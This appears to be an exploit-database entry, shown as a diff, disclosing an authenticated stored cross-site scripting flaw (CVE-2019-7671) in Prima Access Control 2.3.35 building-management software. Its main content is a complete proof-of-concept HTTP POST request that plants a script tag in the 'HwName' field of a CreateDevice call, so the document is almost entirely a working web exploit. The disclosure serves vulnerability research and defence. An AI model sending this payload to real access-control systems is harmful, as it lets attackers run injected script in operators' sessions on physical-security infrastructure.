@@ -1,0 +1,31 @@
+# Exploit Title: Prima Access Control 2.3.35 - 'HwName' Persistent Cross-Site Scripting
+# Google Dork: NA
+# Date: 2019-11-11
+# Exploit Author: LiquidWorm
+# Vendor Homepage: https://www.computrols.com/capabilities-cbas-web/
+# Software Link: https://www.computrols.com/building-automation-software/
+# Version: 2.3.35
+# Tested on: NA
+# CVE : CVE-2019-7671
+# Advisory: https://applied-risk.com/resources/ar-2019-007
+# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
+# Prima Access Control 2.3.35 Authenticated Stored XSS
+
+# PoC
+
+POST /bin/sysfcgi.fx HTTP/1.1
+Host: 192.168.13.37
+Connection: keep-alive
+Content-Length: 265
+Origin: https://192.168.13.37
+Session-ID: 10127047
+User-Agent: Mozi-Mozi/44.0
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Accept: text/html, */*; q=0.01
+Session-Pc: 2
+X-Requested-With: XMLHttpRequest
+Referer: https://192.168.13.37/app/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+
+<requests><request name="CreateDevice"><param name="HwType" value="1000"/><param name="HwParentID" value="0"/><param name="HwLogicParentID" value="0"/><param name="HwName" value=""><script>alert("XSSz")</script>"/></request></requests>
